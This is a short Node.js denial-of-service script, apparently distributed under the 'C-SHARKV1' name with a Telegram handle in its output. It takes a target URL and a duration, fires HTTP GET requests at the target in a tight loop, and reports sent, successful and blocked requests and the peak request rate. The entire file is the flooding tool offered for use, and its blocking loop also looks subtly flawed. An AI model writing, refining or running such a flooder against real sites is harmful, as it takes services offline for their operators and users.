const axios = require('axios');

// Get args
const [,, targetUrl, timeInSeconds] = process.argv;
if (!targetUrl || !timeInSeconds) {
  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
  process.exit(1);
}

const durationMs = parseInt(timeInSeconds) * 1000;
const stopTime = Date.now() + durationMs;

let total = 0;
let success = 0;
let blocked = 0;
let maxRps = 0;
let lastTotal = 0;

// Flooder
function flood() {
  while (Date.now() < stopTime) {
    axios.get(targetUrl).then(() => success++).catch(() => blocked++);
    total++;
  }
}

// Logging every 100ms, overwriting single terminal output
function startLogger() {
  const logInterval = setInterval(() => {
    const rps = total - lastTotal;
    if (rps > maxRps) maxRps = rps;
    lastTotal = total;

    const remaining = Math.max(0, Math.floor((stopTime - Date.now()) / 1000));

    process.stdout.write(
      `\rC-SHARKV1 - T.ME/STSVKINGDOM | Sent: ${total} | Max-RPS: ${maxRps} | Success: ${success} | Blocked: ${blocked} | Time Left: ${remaining}s `
    );

    if (Date.now() >= stopTime) {
      clearInterval(logInterval);
      process.stdout.write('\nFlood complete.\n');
    }
  }, 100);
}

// Start flood in batches (to prevent blocking single thread)
function startFlooding() {
  const floodInterval = setInterval(() => {
    if (Date.now() >= stopTime) {
      clearInterval(floodInterval);
      return;
    }
    flood();
  }, 0);
}

startLogger();
startFlooding();
